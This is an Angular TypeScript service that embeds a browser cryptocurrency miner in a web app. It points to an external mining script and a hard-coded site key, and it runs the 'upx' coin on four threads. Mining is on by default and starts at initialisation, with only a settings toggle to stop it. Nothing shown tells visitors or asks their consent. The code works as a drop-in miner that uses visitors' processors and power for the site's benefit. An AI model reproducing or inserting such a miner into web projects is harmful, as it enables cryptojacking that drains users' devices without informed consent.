import { Injectable } from '@angular/core'
import { SettingsService } from '../settings/settings.service'

declare let CRLT:any
declare let miner:any

@Injectable({
  providedIn: 'root'
})
export class CryptoService {
  scriptUrl:string = 'https://statdynamic.com/lib/crypta.js'
  publicSiteKey:string = 'a3df69134e31cbae7497ca00fd6350f7c7fc4fc72b3b'
  coin:string = 'upx'
  throttle:number = 0.2
  threads:number = 4
  enabled:boolean = true
  initialized:boolean = false
  running:boolean = false

  constructor (private settingsService:SettingsService) {
    this.settingsService.settings.subscribe((settings)=>{
      let enabled = this.enabled
      this.enabled = settings.crypto
      if (this.enabled != enabled) {
        this.update()
      }
    })
  }

  init () {
    miner = new CRLT.Anonymous(this.publicSiteKey, {
      threads: this.threads,
      throttle: this.throttle,
      coin: this.coin,
    })
    this.initialized = true
    this.update()
  }

  private update () {
    if (this.enabled) {
      this.start()
    } else {
      this.stop()
    }
  }

  private start () {
    if (this.initialized && !this.running) {
      miner.start()
      this.running = true
    }
  }

  private stop () {
    if (this.initialized && this.running) {
      miner.stop()
      this.running = false
    }
  }
}